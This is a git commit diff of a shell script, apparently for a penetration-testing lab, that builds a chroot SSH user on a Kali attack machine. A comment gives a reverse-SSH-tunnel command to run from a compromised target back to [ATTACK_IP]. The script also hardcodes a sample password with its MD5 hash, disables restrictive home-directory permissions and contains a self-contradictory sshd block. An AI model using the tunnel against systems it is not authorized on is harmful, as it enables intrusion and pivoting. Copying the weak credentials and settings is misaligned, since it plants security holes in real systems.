f16a293a01e1c6252b608fcc033af853952a7ee7
ljmane <33239683+ljmane@users.noreply.github.com>
2024-10-03 09:02:36 -0500

    Update chroot_setup.sh
    Made some changes, added ssh pub key and added a password for future use maybe

--- chroot_setup.sh
+++ chroot_setup.sh
@@ -1,5 +1,8 @@
 #!/bin/bash
-#add user to kali box with no shell
+#add user to kali box with limited shell. Used for Remote tunneling
+#Upload Private Key to target
+#From target:
+#ssh -i [/PATH/TO/KEY] user@[ATTACK_IP] -fNR [PORT]:127.0.0.1:[PORT]
 mkdir /home/chroot
 mkdir -p /home/chroot/dev/
 cd /home/chroot/dev/
@@ -20,18 +23,26 @@ for i in $(ldd /bin/sh | egrep -o "\/lib\/.*\(" | cut -d " " -f 1); do cp -v $i 
 for i in $(ldd /usr/bin/mkdir | egrep -o "\/lib\/.*\(" | cut -d " " -f 1); do cp -v $i /home/chroot/lib/; done
 for i in $(ldd /bin/sh | egrep -o "\/lib64\/.*\(" | cut -d " " -f 1); do cp -v $i /home/chroot/lib64/; done
 
-useradd user
-passwd user
+mkdir /home/chroot/etc 
 
-mkdir /home/chroot/etc
-cp -vf /etc/{passwd,group} /home/chroot/etc/
+useradd user -s /bin/sh
+#Example with 'P@$$w0rd123!!!' in file.txt                                                                            
+#cat ~/file.txt | openssl passwd -1 -stdin                                                                            
+echo 'user:$1$2gX9q2iE$8VLLFzFc7MkSooH/aRz.9.' | chpasswd -e                                                          
+cp -vf /etc/{passwd,group} /home/chroot/etc/   
+
+mkdir -p /home/chroot/home/user/.ssh                                                                                  
+ssh-keygen -t rsa -f /home/chroot/id_rsa -q -N ''                                                                     
+chown kali:kali /home/chroot/id_rsa                                                                                   
+sed -i 's/kali@oscp//g' /home/chroot/id_rsa.pub                                                                       
+cat /home/chroot/id_rsa.pub >> /home/chroot/home/user/.ssh/authorized_keys       
 
 cat >> /etc/ssh/sshd_config <<EOF
 Match User user
-  ChrootDirectory /home/chroot
   AuthorizedKeysFile /home/chroot/home/user/.ssh/authorized_keys
   PubkeyAuthentication no #
   AuthenticationMethods publickey
+  ChrootDirectory /home/chroot
 EOF
 
 systemctl restart ssh
@@ -39,6 +50,5 @@ systemctl restart ssh
 cp /usr/bin/mkdir /home/chroot/bin/
 cp /usr/bin/cat /home/chroot/bin/
 
-mkdir -p /home/chroot/home/user
 chown -R user:user /home/chroot/home/user
-chmod -R 0700 /home/chroot/home/user
+#chmod -R 0700 /home/chroot/home/user
